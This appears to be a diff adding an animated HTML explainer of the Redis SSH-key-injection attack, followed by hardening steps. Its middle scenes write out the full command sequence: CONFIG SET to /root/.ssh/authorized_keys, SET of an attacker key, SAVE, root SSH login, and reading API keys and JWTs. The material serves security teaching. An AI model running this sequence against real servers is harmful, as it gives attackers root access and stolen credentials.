@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0">
+<title>Redis SSH Key Injection</title>
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{
+  background:#0a0a0f;font-family:'Press Start 2P',monospace;
+  width:100%;height:100vh;overflow:hidden;
+  display:flex;flex-direction:column;align-items:center;color:#fff;
+}
+#app{width:390px;height:100vh;position:relative;overflow:hidden}
+.scene{
+  position:absolute;inset:0;width:390px;height:100vh;
+  display:flex;flex-direction:column;
+  transform:translateX(100%);
+  transition:transform .35s cubic-bezier(.4,0,.2,1);
+  pointer-events:none;
+}
+.scene.active{transform:translateX(0);pointer-events:auto}
+.hdr{height:90px;flex-shrink:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;padding:0 14px;border-bottom:1px solid #2a1f3d}
+.hdr-title{font-size:13px;color:#4ec9e1;text-align:center;letter-spacing:.5px;line-height:1.5}
+.hdr-sub{font-size:9px;color:#666;text-align:center;letter-spacing:1px;line-height:1.5}
+.dots{display:flex;gap:8px}
+.dot{width:11px;height:11px;border-radius:50%;background:#2a1f3d;transition:background .2s}
+.dot.active{background:#4ec9e1}.dot.done{background:#4eff9a}
+.slr{height:28px;flex-shrink:0;display:flex;align-items:center;justify-content:space-between;padding:0 14px}
+.slabel{font-size:9px;letter-spacing:1px}
+.sbadge{font-size:7px;padding:3px 8px;border:1px solid currentColor;border-radius:2px}
+.anim{flex:1;overflow-y:auto;overflow-x:hidden;scrollbar-width:none;-ms-overflow-style:none;min-height:0}
+.anim::-webkit-scrollbar{display:none}
+.info{height:110px;flex-shrink:0;margin:0 12px;border:2px solid #4ec9e1;padding:10px 14px;display:flex;flex-direction:column;justify-content:center;gap:7px;font-size:9px;line-height:1.9}
+.info.am{border-color:#e8a020}.info.rd{border-color:#e85050}.info.gn{border-color:#4eff9a}.info.pu{border-color:#a080ff}
+.il{color:#ccc}.ih{color:#4eff9a}.ih.am{color:#e8a020}.ih.rd{color:#e85050}.ih.pu{color:#a080ff}
+.srow{height:70px;flex-shrink:0;display:flex;gap:8px;padding:8px 12px}
+.sc{flex:1;background:#130d1e;border:1px solid #2a1f3d;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px}
+.sv{font-size:13px;color:#4ec9e1;text-align:center}
+.sv.am{color:#e8a020}.sv.gn{color:#4eff9a}.sv.rd{color:#e85050}.sv.pu{color:#a080ff}
+.sl{font-size:7px;color:#777;text-align:center;line-height:1.4}
+.ctrl{height:60px;flex-shrink:0;display:flex;align-items:center;justify-content:center;gap:10px;padding:0 12px}
+.btn{font-family:'Press Start 2P',monospace;font-size:9px;padding:8px 12px;border:2px solid #4ec9e1;background:transparent;color:#4ec9e1;cursor:pointer;transition:all .15s}
+.btn:hover{background:#4ec9e130}.btn:active{transform:scale(.97)}
+.btn.play{border-color:#4eff9a;color:#4eff9a}.btn.play:hover{background:#4eff9a20}
+.btn:disabled{opacity:.3;cursor:default}
+.btn.restart{border-color:#e85050;color:#e85050}.btn.restart:hover{background:#e8505020}
+.panel{opacity:0;transition:opacity .4s;border-radius:2px}
+.panel.vis{opacity:1}
+.tline{opacity:0;transition:opacity .3s}
+.tline.vis{opacity:1}
+</style>
+</head>
+<body>
+<div id="app">
+
+<!-- ═══════════════════════════════ SCENE 1 ═══════════════════════════════ -->
+<div class="scene active" id="s1" style="background:#0f0003">
+  <div class="hdr" style="background:#0f0003;border-bottom:1px solid #2a0010">
+    <div class="hdr-title" style="color:#e85050;font-size:11px;line-height:1.6">REDIS: NO PASSWORD</div>
+    <div class="hdr-sub">PORT 6379 OPEN TO THE WORLD</div>
+    <div class="dots">
+      <div class="dot active"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+
+  <div class="slr" style="background:#0f0003">
+    <span class="slabel" style="color:#e8a020">EXPOSURE</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">CRITICAL</span>
+  </div>
+
+  <div class="anim" style="background:#0f0003">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <!-- Network diagram SVG -->
+      <div style="background:#000810;border:2px solid #1a0008;border-radius:3px;overflow:hidden">
+        <div style="background:#0d0005;padding:5px 10px;border-bottom:1px solid #1a0008;text-align:center">
+          <span style="font-size:6.5px;color:#e85050">NETWORK TOPOLOGY</span>
+        </div>
+        <svg width="100%" height="175" viewBox="0 0 366 175" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <filter id="glow1"><feGaussianBlur stdDeviation="2.5" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+            <filter id="glowR"><feGaussianBlur stdDeviation="3" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+          </defs>
+
+          <!-- Internet cloud -->
+          <ellipse id="cloud" cx="60" cy="87" rx="44" ry="26" fill="#0a0002" stroke="#333" stroke-width="1.5" opacity="0"/>
+          <text id="ct1" x="60" y="83" text-anchor="middle" font-size="18" fill="#555" font-family="monospace" opacity="0">☁</text>
+          <text id="ct2" x="60" y="97" text-anchor="middle" font-size="5.5" fill="#555" font-family="'Press Start 2P',monospace" opacity="0">INTERNET</text>
+
+          <!-- Attacker laptop -->
+          <rect id="atk" x="4" y="118" width="60" height="38" rx="2" fill="#1a0000" stroke="#e85050" stroke-width="1.5" opacity="0"/>
+          <text id="atk2" x="34" y="135" text-anchor="middle" font-size="13" fill="#e85050" font-family="monospace" opacity="0">💻</text>
+          <text id="atk3" x="34" y="149" text-anchor="middle" font-size="5" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">ATTACKER</text>
+
+          <!-- Wire: attacker → cloud -->
+          <line id="wire1" x1="64" y1="130" x2="68" y2="100" stroke="#e85050" stroke-width="1.2" stroke-dasharray="3,3" opacity="0"/>
+
+          <!-- No firewall label -->
+          <rect id="nfw" x="132" y="72" width="102" height="30" rx="2" fill="#1a0800" stroke="#e8a020" stroke-width="1.5" stroke-dasharray="4,3" opacity="0"/>
+          <text id="nfw2" x="183" y="84" text-anchor="middle" font-size="5.5" fill="#e8a020" font-family="'Press Start 2P',monospace" opacity="0">NO FIREWALL</text>
+          <text id="nfw3" x="183" y="96" text-anchor="middle" font-size="5" fill="#666" font-family="'Press Start 2P',monospace" opacity="0">RULES</text>
+
+          <!-- Wire: cloud → server -->
+          <line id="wire2" x1="104" y1="87" x2="152" y2="87" stroke="#333" stroke-width="1.2" opacity="0"/>
+          <line id="wire3" x1="234" y1="87" x2="270" y2="87" stroke="#333" stroke-width="1.2" opacity="0"/>
+
+          <!-- Redis server box -->
+          <rect id="srv" x="270" y="55" width="90" height="64" rx="2" fill="#0a0002" stroke="#e85050" stroke-width="2" opacity="0"/>
+          <text id="srv2" x="315" y="77" text-anchor="middle" font-size="9" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">REDIS</text>
+          <text id="srv3" x="315" y="93" text-anchor="middle" font-size="6.5" fill="#555" font-family="'Press Start 2P',monospace" opacity="0">:6379</text>
+          <text id="srv4" x="315" y="108" text-anchor="middle" font-size="5.5" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">NO AUTH</text>
+
+          <!-- Port badge -->
+          <rect id="pbadge" x="272" y="33" width="86" height="18" rx="2" fill="#2a0000" opacity="0"/>
+          <text id="pbadge2" x="315" y="45" text-anchor="middle" font-size="5.5" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">0.0.0.0:6379</text>
+
+          <!-- Packet dot -->
+          <circle id="pkt1" cx="34" cy="130" r="4.5" fill="#e85050" opacity="0" filter="url(#glowR)"/>
+
+          <!-- Root badge on server -->
+          <rect id="rootbadge" x="280" y="126" width="70" height="16" rx="2" fill="#1a0000" stroke="#e85050" stroke-width="1" opacity="0"/>
+          <text id="rootbadge2" x="315" y="137" text-anchor="middle" font-size="5" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">RUNS AS ROOT</text>
+
+          <!-- OS label -->
+          <text id="oslabel" x="315" y="158" text-anchor="middle" font-size="5" fill="#444" font-family="'Press Start 2P',monospace" opacity="0">Ubuntu 20.04</text>
+        </svg>
+      </div>
+
+      <!-- What is Redis panel -->
+      <div id="whatbox" class="panel" style="background:#0a0002;border-left:4px solid #e8a020;border-top:1px solid #1a0808;border-right:1px solid #1a0808;border-bottom:1px solid #1a0808;padding:10px 12px">
+        <div style="font-size:7px;color:#e8a020;margin-bottom:7px">▸ WHAT IS REDIS?</div>
+        <div style="font-size:6.5px;color:#aaa;line-height:2.0">
+          In-memory key-value store. Used for caching,<br>
+          sessions, pub/sub. Ships with <span style="color:#e85050">zero authentication</span><br>
+          by default. Designed for trusted networks only.
+        </div>
+      </div>
+
+      <!-- Danger facts -->
+      <div id="dangbox" class="panel" style="background:#080002;border-left:4px solid #e85050;border-top:1px solid #1a0808;border-right:1px solid #1a0808;border-bottom:1px solid #1a0808;padding:10px 12px">
+        <div style="font-size:7px;color:#e85050;margin-bottom:7px">▸ DEFAULT MISCONFIG</div>
+        <div style="font-size:6.5px;color:#aaa;line-height:2.1">
+          <span style="color:#e85050">bind 0.0.0.0</span> — listens on all interfaces<br>
+          <span style="color:#e85050">no requirepass</span> — no password prompt<br>
+          <span style="color:#e85050">CONFIG enabled</span> — can rewrite files<br>
+          <span style="color:#e85050">runs as root</span> — on many cloud images
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info rd">
+    <div class="il">Redis was designed for internal networks — never public.</div>
+    <div class="ih rd">Any attacker who reaches port 6379 has full DB access — no exploit needed.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv rd">6379</div><div class="sl">DEFAULT<br>PORT</div></div>
+    <div class="sc"><div class="sv rd">NONE</div><div class="sl">DEFAULT<br>PASSWORD</div></div>
+    <div class="sc"><div class="sv am">ROOT</div><div class="sl">TYPICAL<br>PROCESS</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" disabled>◀ PREV</button>
+    <button class="btn play" onclick="play(1)">▶ PLAY</button>
+    <button class="btn" onclick="go(2)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════ SCENE 2 ═══════════════════════════════ -->
+<div class="scene" id="s2" style="background:#060010">
+  <div class="hdr" style="background:#060010;border-bottom:1px solid #1a0838">
+    <div class="hdr-title" style="color:#a080ff;font-size:11px;line-height:1.6">THE ATTACK</div>
+    <div class="hdr-sub">CONFIG SET → WRITE SSH KEY</div>
+    <div class="dots">
+      <div class="dot done"></div>
+      <div class="dot active"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+
+  <div class="slr" style="background:#060010">
+    <span class="slabel" style="color:#e8a020">EXPLOIT CHAIN</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">ATTACK</span>
+  </div>
+
+  <div class="anim" style="background:#060010">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <!-- Step 1: Connect -->
+      <div id="step1box" class="panel" style="background:#080010;border:2px solid #a080ff;border-radius:3px;overflow:hidden">
+        <div style="background:#0d0018;padding:5px 10px;display:flex;align-items:center;gap:6px;border-bottom:1px solid #1a0838">
+          <div style="width:7px;height:7px;border-radius:50%;background:#e85050"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#e8a020"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#4eff9a"></div>
+          <div style="flex:1;text-align:center;font-size:6px;color:#555">STEP 1 — CONNECT (no password)</div>
+        </div>
+        <div style="padding:10px 12px;font-size:6.5px;line-height:2.3">
+          <div style="color:#888">$ <span style="color:#a080ff">redis-cli</span> -h 54.210.xx.xx -p 6379</div>
+          <div id="s2l1" class="tline" style="color:#4eff9a">54.210.xx.xx:6379&gt; PING</div>
+          <div id="s2l2" class="tline" style="color:#4eff9a">+PONG</div>
+          <div id="s2l3" class="tline" style="color:#e85050">&#35; Full access — no auth required</div>
+        </div>
+      </div>
+
+      <!-- Step 2: Redirect output -->
+      <div id="step2box" class="panel" style="background:#080010;border:2px solid #e8a020;border-radius:3px;overflow:hidden">
+        <div style="background:#0d0008;padding:5px 10px;display:flex;align-items:center;gap:6px;border-bottom:1px solid #1a0808">
+          <div style="width:7px;height:7px;border-radius:50%;background:#e85050"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#e8a020"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#4eff9a"></div>
+          <div style="flex:1;text-align:center;font-size:6px;color:#555">STEP 2 — REDIRECT DB OUTPUT</div>
+        </div>
+        <div style="padding:10px 12px;font-size:6.5px;line-height:2.3">
+          <div id="s2l4" class="tline" style="color:#888">54.210.xx.xx:6379&gt; <span style="color:#e8a020">CONFIG SET</span> dir /root/.ssh</div>
+          <div id="s2l5" class="tline" style="color:#4eff9a">+OK</div>
+          <div id="s2l6" class="tline" style="color:#888">54.210.xx.xx:6379&gt; <span style="color:#e8a020">CONFIG SET</span> dbfilename authorized_keys</div>
+          <div id="s2l7" class="tline" style="color:#4eff9a">+OK</div>
+          <div id="s2l8" class="tline" style="color:#e85050">&#35; Redis will now SAVE to /root/.ssh/authorized_keys</div>
+        </div>
+      </div>
+
+      <!-- Step 3: Write the key -->
+      <div id="step3box" class="panel" style="background:#080010;border:2px solid #e85050;border-radius:3px;overflow:hidden">
+        <div style="background:#0d0002;padding:5px 10px;display:flex;align-items:center;gap:6px;border-bottom:1px solid #1a0008">
+          <div style="width:7px;height:7px;border-radius:50%;background:#e85050"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#e8a020"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#4eff9a"></div>
+          <div style="flex:1;text-align:center;font-size:6px;color:#555">STEP 3 — INJECT KEY + SAVE</div>
+        </div>
+        <div style="padding:10px 12px;font-size:6.5px;line-height:2.3">
+          <div id="s2l9" class="tline" style="color:#888">54.210.xx.xx:6379&gt; <span style="color:#e85050">SET</span> pwn <span style="color:#4eff9a">"\n\nss-rsa AAAA...attacker_pubkey\n\n"</span></div>
+          <div id="s2l10" class="tline" style="color:#4eff9a">+OK</div>
+          <div id="s2l11" class="tline" style="color:#888">54.210.xx.xx:6379&gt; <span style="color:#e85050">SAVE</span></div>
+          <div id="s2l12" class="tline" style="color:#4eff9a">+OK</div>
+          <div id="s2l13" class="tline" style="color:#e85050">&#35; File written: /root/.ssh/authorized_keys ✓</div>
+        </div>
+      </div>
+
+      <!-- File write diagram -->
+      <div id="fwdiag" class="panel" style="background:#000810;border:2px solid #1a0038;border-radius:3px;overflow:hidden">
+        <div style="background:#00050d;padding:5px 10px;border-bottom:1px solid #1a0838;text-align:center">
+          <span style="font-size:6px;color:#a080ff">WHAT REDIS WRITES TO DISK</span>
+        </div>
+        <div style="padding:8px 10px;font-size:6px;line-height:2.1;color:#555">
+          <div>REDIS0011<span style="color:#333">···</span><span style="color:#e8a020">(RDB header junk)</span></div>
+          <div style="color:#333">···</div>
+          <div><span style="color:#4eff9a">ssh-rsa AAAA...attacker_key attacker@host</span></div>
+          <div style="color:#333">···</div>
+          <div><span style="color:#555">(SSH ignores junk lines, uses the valid key)</span></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info rd">
+    <div class="il">CONFIG SET changes Redis's live config with no restart needed.</div>
+    <div class="ih rd">SAVE flushes the DB to disk — directly into /root/.ssh/authorized_keys.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv rd">4</div><div class="sl">COMMANDS<br>NEEDED</div></div>
+    <div class="sc"><div class="sv rd">0</div><div class="sl">CVEs<br>REQUIRED</div></div>
+    <div class="sc"><div class="sv am">&lt;5s</div><div class="sl">TIME TO<br>EXPLOIT</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="go(1)">◀ PREV</button>
+    <button class="btn play" onclick="play(2)">▶ PLAY</button>
+    <button class="btn" onclick="go(3)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════ SCENE 3 ═══════════════════════════════ -->
+<div class="scene" id="s3" style="background:#000a00">
+  <div class="hdr" style="background:#000a00;border-bottom:1px solid #003000">
+    <div class="hdr-title" style="color:#e85050;font-size:11px;line-height:1.6">ROOT ACCESS</div>
+    <div class="hdr-sub">SSH LOGIN + DATA EXFILTRATION</div>
+    <div class="dots">
+      <div class="dot done"></div>
+      <div class="dot done"></div>
+      <div class="dot active"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+
+  <div class="slr" style="background:#000a00">
+    <span class="slabel" style="color:#e85050">POST-EXPLOIT</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">OWNED</span>
+  </div>
+
+  <div class="anim" style="background:#000a00">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <!-- SSH login terminal -->
+      <div id="sshterm" class="panel" style="background:#000800;border:2px solid #e85050;border-radius:3px;overflow:hidden">
+        <div style="background:#010d01;padding:5px 10px;display:flex;align-items:center;gap:6px;border-bottom:1px solid #0d2008">
+          <div style="width:7px;height:7px;border-radius:50%;background:#e85050"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#e8a020"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#4eff9a"></div>
+          <div style="flex:1;text-align:center;font-size:6px;color:#555">SSH — ROOT LOGIN</div>
+        </div>
+        <div style="padding:10px 12px;font-size:6.5px;line-height:2.3">
+          <div style="color:#888">$ <span style="color:#4eff9a">ssh</span> -i attacker.key root@54.210.xx.xx</div>
+          <div id="s3l1" class="tline" style="color:#555">Welcome to Ubuntu 20.04.5 LTS</div>
+          <div id="s3l2" class="tline" style="color:#555">Last login: never</div>
+          <div id="s3l3" class="tline" style="color:#e85050">root@victim:~# <span id="s3cursor" style="display:inline-block;width:8px;height:10px;background:#e85050;opacity:0"></span></div>
+          <div id="s3l4" class="tline" style="color:#888">root@victim:~# <span style="color:#4eff9a">whoami</span></div>
+          <div id="s3l5" class="tline" style="color:#e85050;font-size:11px">root</div>
+          <div id="s3l6" class="tline" style="color:#888">root@victim:~# <span style="color:#4eff9a">id</span></div>
+          <div id="s3l7" class="tline" style="color:#e85050">uid=0(root) gid=0(root) groups=0(root)</div>
+        </div>
+      </div>
+
+      <!-- Data theft -->
+      <div id="dataterm" class="panel" style="background:#000800;border:2px solid #e8a020;border-radius:3px;overflow:hidden">
+        <div style="background:#010d01;padding:5px 10px;display:flex;align-items:center;gap:6px;border-bottom:1px solid #1a1008">
+          <div style="width:7px;height:7px;border-radius:50%;background:#e85050"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#e8a020"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#4eff9a"></div>
+          <div style="flex:1;text-align:center;font-size:6px;color:#555">REDIS DATA — KEYS * / GET</div>
+        </div>
+        <div style="padding:10px 12px;font-size:6.5px;line-height:2.3">
+          <div id="s3l8" class="tline" style="color:#888">54.210.xx.xx:6379&gt; <span style="color:#e8a020">KEYS</span> *</div>
+          <div id="s3l9" class="tline" style="color:#aaa">1) "session:user:8821"</div>
+          <div id="s3l10" class="tline" style="color:#aaa">2) "api:key:stripe_live_sk_..."</div>
+          <div id="s3l11" class="tline" style="color:#aaa">3) "cache:jwt:eyJhbGci..."</div>
+          <div id="s3l12" class="tline" style="color:#888">54.210.xx.xx:6379&gt; <span style="color:#e8a020">GET</span> api:key:stripe_live_sk_...</div>
+          <div id="s3l13" class="tline" style="color:#e85050">"sk_live_4xKa8mN2...FULL API KEY EXPOSED"</div>
+        </div>
+      </div>
+
+      <!-- Impact cards -->
+      <div id="impactrow" class="panel" style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
+        <div style="background:#100000;border:2px solid #e85050;border-radius:2px;padding:9px 8px">
+          <div style="font-size:6.5px;color:#e85050;margin-bottom:6px">OS IMPACT</div>
+          <div style="font-size:6px;color:#aaa;line-height:2.0">
+            Full root shell<br>
+            Read /etc/shadow<br>
+            Pivot to VPC<br>
+            Ransomware drop
+          </div>
+        </div>
+        <div style="background:#100500;border:2px solid #e8a020;border-radius:2px;padding:9px 8px">
+          <div style="font-size:6.5px;color:#e8a020;margin-bottom:6px">DATA IMPACT</div>
+          <div style="font-size:6px;color:#aaa;line-height:2.0">
+            Session hijack<br>
+            API key theft<br>
+            JWT forgery<br>
+            Cached PII leak
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info rd">
+    <div class="il">SSH ignores malformed lines in authorized_keys — only the valid pubkey matters.</div>
+    <div class="ih rd">One Redis SAVE = permanent root backdoor. No password. No logs. No alerts.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv rd">ROOT</div><div class="sl">ACCESS<br>LEVEL</div></div>
+    <div class="sc"><div class="sv rd">∞</div><div class="sl">PERSISTENCE<br>DURATION</div></div>
+    <div class="sc"><div class="sv am">SILENT</div><div class="sl">DETECTION<br>DEFAULT</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="go(2)">◀ PREV</button>
+    <button class="btn play" onclick="play(3)">▶ PLAY</button>
+    <button class="btn" onclick="go(4)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════ SCENE 4 ═══════════════════════════════ -->
+<div class="scene" id="s4" style="background:#001208">
+  <div class="hdr" style="background:#001208;border-bottom:1px solid #003818">
+    <div class="hdr-title" style="color:#4eff9a;font-size:11px;line-height:1.6">HARDENING</div>
+    <div class="hdr-sub">4 CONTROLS THAT STOP THIS ATTACK</div>
+    <div class="dots">
+      <div class="dot done"></div>
+      <div class="dot done"></div>
+      <div class="dot done"></div>
+      <div class="dot active"></div>
+    </div>
+  </div>
+
+  <div class="slr" style="background:#001208">
+    <span class="slabel" style="color:#4eff9a">DEFENCE</span>
+    <span class="sbadge" style="color:#4eff9a;border-color:#4eff9a">FIX NOW</span>
+  </div>
+
+  <div class="anim" style="background:#001208">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <!-- Fix 1 -->
+      <div id="fix1" class="panel" style="background:#000d04;border-left:4px solid #4eff9a;border-top:1px solid #0a2010;border-right:1px solid #0a2010;border-bottom:1px solid #0a2010;padding:10px 12px">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:7px">
+          <span style="font-size:13px">🔒</span>
+          <span style="font-size:7px;color:#4eff9a">FIX 1 — requirepass</span>
+        </div>
+        <div style="background:#000802;border:1px solid #0a2008;padding:7px 8px;font-size:6.5px;color:#4eff9a;line-height:2.0;margin-bottom:5px">
+          # /etc/redis/redis.conf<br>
+          <span style="color:#e8a020">requirepass</span> <span style="color:#a080ff">Str0ng!RandPass#92xK</span>
+        </div>
+        <div style="font-size:6px;color:#888;line-height:1.8">Enforces authentication on every connection. Use a long random password — Redis AUTH is fast to brute-force without rate limiting.</div>
+      </div>
+
+      <!-- Fix 2 -->
+      <div id="fix2" class="panel" style="background:#000d04;border-left:4px solid #4ec9e1;border-top:1px solid #0a2010;border-right:1px solid #0a2010;border-bottom:1px solid #0a2010;padding:10px 12px">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:7px">
+          <span style="font-size:13px">🌐</span>
+          <span style="font-size:7px;color:#4ec9e1">FIX 2 — bind 127.0.0.1</span>
+        </div>
+        <div style="background:#000802;border:1px solid #0a2008;padding:7px 8px;font-size:6.5px;color:#4eff9a;line-height:2.0;margin-bottom:5px">
+          # /etc/redis/redis.conf<br>
+          <span style="color:#e8a020">bind</span> <span style="color:#4ec9e1">127.0.0.1</span><br>
+          <span style="color:#555"># or VPC-internal IP only</span>
+        </div>
+        <div style="font-size:6px;color:#888;line-height:1.8">Loopback-only binding makes port 6379 unreachable from outside the machine entirely. Also enforce with firewall rules (iptables / security groups).</div>
+      </div>
+
+      <!-- Fix 3 -->
+      <div id="fix3" class="panel" style="background:#000d04;border-left:4px solid #a080ff;border-top:1px solid #0a2010;border-right:1px solid #0a2010;border-bottom:1px solid #0a2010;padding:10px 12px">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:7px">
+          <span style="font-size:13px">🚫</span>
+          <span style="font-size:7px;color:#a080ff">FIX 3 — rename CONFIG</span>
+        </div>
+        <div style="background:#000802;border:1px solid #0a2008;padding:7px 8px;font-size:6.5px;color:#4eff9a;line-height:2.0;margin-bottom:5px">
+          # /etc/redis/redis.conf<br>
+          <span style="color:#e8a020">rename-command</span> CONFIG <span style="color:#a080ff">""</span><br>
+          <span style="color:#e8a020">rename-command</span> SAVE <span style="color:#a080ff">""</span><br>
+          <span style="color:#e8a020">rename-command</span> DEBUG <span style="color:#a080ff">""</span>
+        </div>
+        <div style="font-size:6px;color:#888;line-height:1.8">Empty string disables the command entirely. Rename to a secret token instead of "" if you still need it for ops. SLAVEOF and FLUSHALL also worth disabling.</div>
+      </div>
+
+      <!-- Fix 4 -->
+      <div id="fix4" class="panel" style="background:#000d04;border-left:4px solid #e8a020;border-top:1px solid #0a2010;border-right:1px solid #0a2010;border-bottom:1px solid #0a2010;padding:10px 12px">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:7px">
+          <span style="font-size:13px">👤</span>
+          <span style="font-size:7px;color:#e8a020">FIX 4 — non-root user</span>
+        </div>
+        <div style="background:#000802;border:1px solid #0a2008;padding:7px 8px;font-size:6.5px;color:#4eff9a;line-height:2.0;margin-bottom:5px">
+          # systemd unit override<br>
+          <span style="color:#e8a020">User</span>=<span style="color:#a080ff">redis</span><br>
+          <span style="color:#e8a020">Group</span>=<span style="color:#a080ff">redis</span><br>
+          <span style="color:#555"># redis user has no shell, no SSH</span>
+        </div>
+        <div style="font-size:6px;color:#888;line-height:1.8">Even if all else fails, a non-privileged user can't write to /root/.ssh. Defense in depth: each layer limits blast radius independently.</div>
+      </div>
+
+      <!-- Comparison summary -->
+      <div id="sumbox" class="panel" style="background:#000810;border:2px solid #1a2810;border-radius:3px;overflow:hidden">
+        <div style="background:#00050d;padding:5px 10px;border-bottom:1px solid #0a2008;text-align:center">
+          <span style="font-size:6px;color:#4eff9a">CONTROL EFFECTIVENESS</span>
+        </div>
+        <svg width="100%" height="90" viewBox="0 0 366 90" xmlns="http://www.w3.org/2000/svg">
+          <text x="10" y="20" font-size="6" fill="#666" font-family="'Press Start 2P',monospace">requirepass</text>
+          <rect x="110" y="11" width="0" height="10" fill="#4eff9a" id="bar1"/>
+          <text id="bar1pct" x="118" y="20" font-size="5.5" fill="#4eff9a" font-family="'Press Start 2P',monospace" opacity="0">60%</text>
+
+          <text x="10" y="40" font-size="6" fill="#666" font-family="'Press Start 2P',monospace">bind 127.0.0.1</text>
+          <rect x="110" y="31" width="0" height="10" fill="#4ec9e1" id="bar2"/>
+          <text id="bar2pct" x="118" y="40" font-size="5.5" fill="#4ec9e1" font-family="'Press Start 2P',monospace" opacity="0">85%</text>
+
+          <text x="10" y="60" font-size="6" fill="#666" font-family="'Press Start 2P',monospace">rename CMD</text>
+          <rect x="110" y="51" width="0" height="10" fill="#a080ff" id="bar3"/>
+          <text id="bar3pct" x="118" y="60" font-size="5.5" fill="#a080ff" font-family="'Press Start 2P',monospace" opacity="0">70%</text>
+
+          <text x="10" y="80" font-size="6" fill="#666" font-family="'Press Start 2P',monospace">non-root</text>
+          <rect x="110" y="71" width="0" height="10" fill="#e8a020" id="bar4"/>
+          <text id="bar4pct" x="118" y="80" font-size="5.5" fill="#e8a020" font-family="'Press Start 2P',monospace" opacity="0">95%</text>
+        </svg>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info gn">
+    <div class="il">Apply all four controls — each one independently breaks the attack chain.</div>
+    <div class="ih">Bind + non-root + no CONFIG = this exploit is fully mitigated.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv gn">4</div><div class="sl">CONTROLS<br>AVAILABLE</div></div>
+    <div class="sc"><div class="sv gn">0</div><div class="sl">CVEs TO<br>PATCH</div></div>
+    <div class="sc"><div class="sv am">CONFIG</div><div class="sl">ROOT<br>CAUSE</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="go(3)">◀ PREV</button>
+    <button class="btn play" onclick="play(4)">▶ PLAY</button>
+    <button class="btn restart" onclick="go(1)">↩ RESTART</button>
+  </div>
+</div>
+
+</div>
+<script>
+let cur = 1, T = [];
+function clr() { T.forEach(t => clearTimeout(t)); T = []; }
+function af(ms, fn) { T.push(setTimeout(fn, ms)); }
+
+function show(id, ms) {
+  af(ms, () => {
+    const e = document.getElementById(id);
+    if (e) { e.style.opacity = '1'; e.classList.add('vis'); }
+  });
+}
+function hide(id) {
+  const e = document.getElementById(id);
+  if (e) { e.style.opacity = '0'; e.classList.remove('vis'); }
+}
+function showEl(id, ms) { af(ms, () => { const e = document.getElementById(id); if (e) e.style.opacity = '1'; }); }
+function hideEl(id) { const e = document.getElementById(id); if (e) e.style.opacity = '0'; }
+function svgShow(id, ms) { af(ms, () => { const e = document.getElementById(id); if (e) e.setAttribute('opacity','1'); }); }
+function svgHide(id) { const e = document.getElementById(id); if (e) e.setAttribute('opacity','0'); }
+
+function animBar(id, labelId, targetW, color, ms) {
+  af(ms, () => {
+    const bar = document.getElementById(id);
+    const lbl = document.getElementById(labelId);
+    if (!bar) return;
+    bar.style.transition = 'width .6s ease';
+    bar.style.width = targetW + 'px';
+    if (lbl) { lbl.setAttribute('opacity','1'); lbl.setAttribute('x', 110 + targetW + 4); }
+  });
+}
+
+function movePkt(id, x1, y1, x2, y2, startMs, durMs) {
+  af(startMs, () => {
+    const d = document.getElementById(id); if (!d) return;
